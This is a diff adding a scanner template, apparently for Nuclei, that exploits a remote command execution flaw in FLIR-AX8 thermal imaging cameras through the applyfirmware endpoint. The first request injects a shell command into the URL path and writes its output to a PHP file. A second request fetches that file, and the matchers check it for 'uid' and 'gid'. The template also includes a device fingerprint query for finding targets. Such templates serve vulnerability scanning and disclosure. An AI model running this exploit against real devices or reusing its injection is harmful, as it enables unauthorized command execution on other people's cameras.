@@ -1,0 +1,41 @@
+id: flir-applyfirmware-rce
+info:
+  name: FLIR-AX8 热成像仪 applyfirmware - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/FLIR/FLIR-AX8%E7%83%AD%E6%88%90%E5%83%8F%E4%BB%AAapplyfirmware%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: demo
+    hunter-query: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
+  tags: flir,rce
+
+http:
+  - raw:
+      - |
+        GET /settings/applyfirmware/;id>{{randstr}}.php;/false HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: ******
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+
+      - |+
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200  && status_code_2 == 200
+          - contains_all(body,'uid','gid')
+        condition: and
